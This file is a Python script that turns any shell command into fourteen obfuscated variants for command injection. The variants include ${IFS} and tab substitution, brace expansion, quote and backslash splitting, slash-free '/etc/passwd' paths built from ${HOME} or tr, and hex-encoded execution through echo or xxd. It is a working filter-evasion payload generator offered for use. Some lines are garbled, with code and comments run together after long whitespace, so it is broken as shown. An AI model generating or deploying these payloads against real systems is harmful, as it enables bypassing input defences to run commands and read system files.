import sys
                                                               def generate_table(input_str):
    if not input_str:
        return

    # Split the input string to isolate the main command and arguments
    parts = input_str.split(' ', 1)
    cmd = parts[0]
    args = parts[1] if len(parts) > 1 else ""

    # Establish structural splits for the command binary (e.g., 'cat' -> 'c', 'at')
    first = cmd[0] if len(cmd) > 0 else ""
    rest = cmd[1:] if len(cmd) > 1 else ""

    # 1. ifs
    # Replaces spaces with the shell's Internal Field Separator variable
    v_ifs = f"{cmd}${{IFS}}{args}" if args else cmd

    # 2. brace                                                     # Wraps the components in comma-separated brace expansion groups
    v_brace = f"{{{cmd},{args}}}" if args else f"{{{cmd},}}"

    # 3. redirect
    # Replaces spaces with a standard input redirection bracket
    v_redirect = f"{cmd}<{args}" if args else cmd

    # 4. tab
    # Replaces space separators with the hex representation of a horizontal tab character
    v_tab = f"{cmd}%09{args}" if args else cmd

    # 5. quote-'
    v_quote_single = f"{first}'{rest}' {args}".strip()

    # 6. quote-"
    v_quote_double = f'{first}"{rest}" {args}'.strip()

    # 7. backtick
    v_backtick = f"{first}``{rest} {args}".strip()

    # 8. backslash
    v_backslash = f"{first}\\{rest} {args}".strip()

    # 9. $@
    v_dollar_at = f"{first}$@{rest} {args}".strip()

    # 10. $()
    v_dollar_paren = f"{first}$(){rest} {args}".strip()

    # 11. home-slice
    # Generates a forward slash character slice utilizing system environmental variables
    v_home_slice = f"{cmd} ${{HOME:0:1}}etc${{HOME:0:1}}passwd" if "etc/passwd" in args else f"{cmd} {args}"

    # 12. tr-slice
    # Uses character translation offsets via the 'tr' binary to construct filepaths dynamically
    v_tr_slice = f"{cmd} $(echo . | tr '!-0' '-1')etc$(echo . | tr '!-0' '-1')passwd" if "etc/passwd" in args else f"{cmd} {args}"

    # 13. hex-echo
    # Converts the full string into hex escape sequences executed inside backticks
    hex_str = "".join([f"\\x{ord(c):02x}" for c in input_str])
    v_hex_echo = f'`echo -e "{hex_str}"`'

    # 14. xxd
    # Formats the command string as a raw hexadecimal stream passed directly to xxd reverse processing
    plain_hex = "".join([f"{ord(c):02x}" for c in input_str])
    v_xxd = f'`xxd -r -p <<< {plain_hex}`'

    # Print formatting structured to mirror the alignment of the reference table
    print(f"{'ifs':<15} {v_ifs}")
    print(f"{'brace':<15} {v_brace}")
    print(f"{'redirect':<15} {v_redirect}")
    print(f"{'tab':<15} {v_tab}")
    print(f"{'quote-\'':<15} {v_quote_single}")
    print(f"{'quote-\"':<15} {v_quote_double}")
    print(f"{'backtick':<15} {v_backtick}")
    print(f"{'backslash':<15} {v_backslash}")
    print(f"{'$@':<15} {v_dollar_at}")
    print(f"{'$()':<15} {v_dollar_paren}")
    print(f"{'home-slice':<15} {v_home_slice}")
    print(f"{'tr-slice':<15} {v_tr_slice}")
    print(f"{'hex-echo':<15} {v_hex_echo}")
    print(f"{'xxd':<15} {v_xxd}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)

    # Grab the string argument directly from the command line execution
    user_input = sys.argv[1]
    generate_table(user_input)